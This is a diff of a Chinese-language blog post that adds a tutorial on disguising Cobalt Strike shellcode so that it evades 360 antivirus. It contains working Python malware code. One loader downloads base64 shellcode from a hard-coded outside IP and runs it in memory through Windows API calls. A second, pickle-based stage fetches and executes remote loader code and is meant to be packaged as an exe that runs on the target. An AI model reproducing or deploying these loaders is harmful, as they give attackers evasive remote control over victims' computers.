@@ -458,21 +458,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-07
+                    2022-04-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    77
+                    558
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -506,7 +506,66 @@
 
 
 
-<h2 id="CS免杀过360"><a href="#CS免杀过360" class="headerlink" title="CS免杀过360"></a>CS免杀过360</h2>
+<h2 id="CS-shellcode免杀过360"><a href="#CS-shellcode免杀过360" class="headerlink" title="CS shellcode免杀过360"></a>CS shellcode免杀过360</h2><p>目前使用python3处理CS神器生成的shellcode免杀效果还是可以的；使用基于python3的脚本对shellcode做处理，生成exe后进行免杀。</p>
+<ul>
+<li>使用CS生成python格式的payload</li>
+</ul>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220410135043357.png"></p>
+<ul>
+<li><p>把shellcode进行BS64加密放在shellcode.txt里面并存放到服务器</p>
+</li>
+<li><p>修改加载器的服务器地址后进行一次BS64加密，然后把代码放在loader.txt里面并存放到服务器</p>
+</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span>codecs<span class="token punctuation">,</span>base64
+shellcode <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://39.103.232.183/shellcode.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+ 
+shellcode <span class="token operator">=</span>codecs<span class="token punctuation">.</span>escape_decode<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+ 
+shellcode <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64
+ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>RtlMoveMemory<span class="token punctuation">(</span>
+    ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    buf<span class="token punctuation">,</span>
+    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span>
+handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>
+    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span>
+ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>WaitForSingleObject<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>最终在目标上执行的exe文件，修改服务器地址后使用pyinstaller打包成exe可执行文件</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> ctypes<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span>codecs<span class="token punctuation">,</span>base64
+sectr <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://192.168.0.1:80/loader.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sectr <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sectr<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>sectr<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ret <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ret_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+ret_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ret_base64<span class="token punctuation">)</span>
+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>ret_decode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="shellcode加载器"><a href="#shellcode加载器" class="headerlink" title="shellcode加载器"></a>shellcode加载器</h2><p>要想运行shellcode并上线机器的话，最常见的办法就是编写shellcode加载器，那么什么是shellcode加载器呢？</p>
+<blockquote>
+<p>我们知道在计算机中无论什么程序到最后都会转换成二进制代码让CPU去运行，而CPU是负责运算和处理的，内存是交换数据的，没有内存，CPU就没法接收到数据。内存是计算机与CPU进行沟通的桥梁。计算机中所有程序的运行都是在内存中进行的。</p>
+</blockquote>
+<p>所以shellcode加载器就是为shellcode申请一段内存然后把shellcode加载到内存中让机器执行这段shellcode（这里需要大量使用Windows API函数）。</p>
+
                 
             </div>
             <hr/>
